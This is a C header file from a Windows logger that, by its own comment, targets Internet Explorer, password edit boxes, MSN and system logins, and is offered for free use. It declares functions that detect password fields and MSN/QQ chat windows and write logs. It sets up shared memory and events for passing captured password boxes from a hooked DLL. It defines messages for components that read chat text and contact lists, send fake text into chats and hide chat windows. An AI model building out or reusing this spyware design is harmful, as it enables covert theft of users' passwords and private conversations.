#ifndef MSGLOBALDEF_X
#define MSGLOBALDEF_X

/************************************
  REVISION LOG ENTRY
  Revision By: Zhang, Zhefu
  E-mail: codetiger@hotmail.com
  Revised on 7/3/2003 
  Comment: This is part of the logger for IE, password edit, MSN, system login.
           You are free to use to use the code on the base of keeping this comment
		   All rights reserved. May not be sold for profit.
 ************************************/

#include <windows.h>
#include <tchar.h>


void ReportErr(LPCTSTR str, ...);

#include <stdio.h> 
void PopMsg(LPCTSTR pszFormat, ...) ;

//Various Target Window
BOOL IsMSNChat(HWND hWnd);
BOOL IsMSNMain(HWND hWnd);
BOOL IsQQChat(HWND hWnd);
BOOL IsQQMain(HWND hWnd);
//Check the Edit Array and Confirm they are password edit, if not, NULL it
BOOL IsPasswordEdit(HWND hEdit);

BOOL WriteLogStr(LPCVOID str);
BOOL WriteLogInt(DWORD dwData, int radix);
BOOL IsQQMainWindow(HWND hWnd);
BOOL IsDialog(HWND hWnd);
BOOL IsAfxWnd(HWND hWnd);
BOOL IsRichedit(HWND hWnd);

#define MAX_SEND_CHAT 4096
#define MAX_HIS_CHAT  64*1024
#define MAX_PWD_EDIT 20   //Maximum tracking 100 password dialog
#define MAX_MSN_CONCUR_CHAT 10      //Maximum concurrent chat by MSN ( 10 by default ) 
#define MAX_QQ_CONCUR_CHAT 10      //Maximum concurrent chat by QQ ( 10 by default ) 
#define MAX_QQ_CONCUR_MAIN 10      //Maximum concurrent main window by QQ ( 10 by default ) 

#define MAX_WAIT 500      //Hook side Max waiting time 
#define RICH_WND_CLASS _T("QOOM_RICHWND")
#define QOOM_MAINWND   _T("QOOM_MAINWND")
// QQ's parent window for hiding qq chat windows.
#define QQ_PARENT_WND_CLASS      _T("QOOM_QQPARENT")
#define QQ_PARENT_WND_TITLE      _T("QOOM_QQPARENT")
// QQ and MSN's process name
#define g_QQExeName		_T("QQ.exe")
#define g_MSNExeName	_T("msnmsgr.exe")

#define NightmareMMFSize  64 * 1024  //1 Mb
#define NightmarePage     64 * 1024  //Win2000 ---- 1 Page = 64 Kb 


//MMF to transfer password editbox and its sibling, MSN, IE, etc...
#define g_MMF_NAME  _T("{AF60EB27-C70A-4f36-8D68-6FEA9998C884}") //place holder
#define g_READ_EVENT_MMF_NAME  _T("{85B7FBAC-D46B-40ae-A604-FD28168D3A8B}") //if set client go
#define g_WRITE_EVENT_MMF_NAME  _T("{48208702-377D-4c54-A13F-7D62A16E4714}") //if set Dll go
#define g_RICHEDIT_EVENT_NAME  _T("{48208704-377v-4c54-A13F-7D62516E4714}") //if set Dll go
#define g_QUERY_EVENT_NAME  _T("{48208504-377g-4c52-A15F-7h62516E4715}") //if set Dll go


#define WPARAM_CLEAR_PREVIOUS_TEXT   0x123  //Flag wParam to Clear Low Richedit Ctrl in Chat Window
#define LPARAM_SEND_TEXT_INSTANTLY   0x456  //Flag lParam to Send Fake Text in Low Richedit Ctrl Instantly

// Message between richedit and monitorservice.
#define WM_MSN_SETMESSAGE			WM_USER + 1001
#define WM_MSN_GETMESSAGE   		WM_USER + 1002
#define WM_MSN_INSERTHWND   		WM_USER + 1003
#define WM_MSN_DELETEHWND   		WM_USER + 1004
#define WM_MSN_GETCHATCNT   		WM_USER + 1005
#define WM_MSN_SETCHATCNT   		WM_USER + 1006

// Messages between monitor and qoom main window
#define WM_MSN_CREATECHAT   		WM_USER + 1010
#define WM_MSN_DESTROYCHAT   		WM_USER + 1011
#define WM_QQ_CREATECHAT   		    WM_USER + 1012
#define WM_QQ_DESTROYCHAT  		    WM_USER + 1013

// Messages between spook and QQ or msn chat windows
#define WM_MSNSPOOK_SENDTEXT         WM_USER + 4849
#define WM_MSNSPOOK_QUERYTEXT        WM_USER + 4850
#define WM_MSNSPOOK_QUERYCONTACTLIST WM_USER + 4851

#define WM_QQSPOOK_SENDTEXT          WM_USER + 4852
#define WM_QQSPOOK_QUERYTEXT         WM_USER + 4853
#define WM_QQSPOOK_QUERYCONTACTLIST  WM_USER + 4854
#define WM_MSN_SHOWCHATWINDOW        WM_USER + 4855

#define WM_QQSPOOK_DESTROYMAIN		 WM_USER + 4856
#define WM_MSNSPOOK_DESTROYMAIN		 WM_USER + 4857

// Messages between thread and qoom main window
#define WM_QQ_TEXT_CHANGE			 WM_USER + 4900

// Messages for tray icon
#define WM_TRAY_MESSAGE		 		 WM_USER + 5000

//chatter name buffer max length
#define MAX_CHATTER_ADDRESS  255
//Set chat data to richedit.
typedef struct tagMYREC
{
	TCHAR szText[MAX_SEND_CHAT];
	DWORD dwIndex;
	DWORD dwSize;
} MYREC;

#endif
